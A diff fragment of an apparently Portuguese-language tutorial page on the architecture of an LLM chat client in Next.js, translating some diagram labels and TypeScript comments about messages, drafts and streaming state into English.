+  .toast[data-leaving='true'] { animation-name: toast-fade-out; }
 }
 @keyframes toast-fade-in  { from { opacity: 0; } }
 @keyframes toast-fade-out { to   { opacity: 0; } }
@@ -1648,13 +1648,13 @@ function ToastItem({ toast, fechar, remover }: {
 <pre><code>┌──────────────────────── Cliente (Next.js / React) ────────────────────────┐
 │  ConversationList          │  Thread                                       │
 │  (estado de servidor:      │   MessageList  (virtualizada)                 │
-│   TanStack Query)          │     Message → Part[] → Texto | Ferramenta     │
+│   TanStack Query)          │     Message → Part[] → Text | Tool            │
 │                            │   Composer  (rascunho por conversa)           │
 │                                                                            │
 │  ChatStore   mensagens por conversa · status por mensagem · streams ativos │
 │  StreamClient  fetch + parser SSE + AbortController (o exercício 1)        │
 └───────────────┬────────────────────────────────────────────────────────────┘
-                │ POST /api/chat → text/event-stream     GET /api/conversas
+                │ POST /api/chat → text/event-stream     GET /api/conversations
 ┌───────────────▼──────────────── BFF (Route Handlers) ──────────────────────┐
 │ auth · rate limit por usuário · monta o histórico · chama o LLM            │
 │ executa ferramentas · exige aprovação · grava mensagens e uso de tokens    │
@@ -1669,16 +1669,16 @@ type Message = {
   id: string;
   conversationId: string;
   role: 'user' | 'assistant';
-  parts: Part[];                 // texto, chamadas e resultados de ferramenta (exercício 5)
+  parts: Part[];                 // text, tool calls and tool results (exercise 5)
   status: 'streaming' | 'complete' | 'incomplete' | 'error';
-  parentId: string | null;       // regenerar cria um irmão, não sobrescreve
+  parentId: string | null;       // regenerating creates a sibling, it does not overwrite
   createdAt: string;
 };
 
-// só no cliente
+// client only
 type ChatUiState = {
-  drafts: Record&lt;string, string&gt;;                // rascunho por conversa (persistido)
-  activeStreams: Record&lt;string, AbortController&gt;; // por messageId
+  drafts: Record&lt;string, string&gt;;                // draft per conversation (persisted)
+  activeStreams: Record&lt;string, AbortController&gt;; // by messageId
 };
 </code></pre>
       <p><strong>Divisão de estado:</strong> lista de conversas e mensagens já gravadas são <em>estado de servidor</em> (cache, paginação, revalidação ao focar a aba). A mensagem que está chegando vive no store do cliente e, ao terminar, é reconciliada com o cache pelo mesmo <code>id</code>, que o cliente gera antes de enviar: é isso que deixa a mensagem otimista virar a definitiva sem piscar.</p>
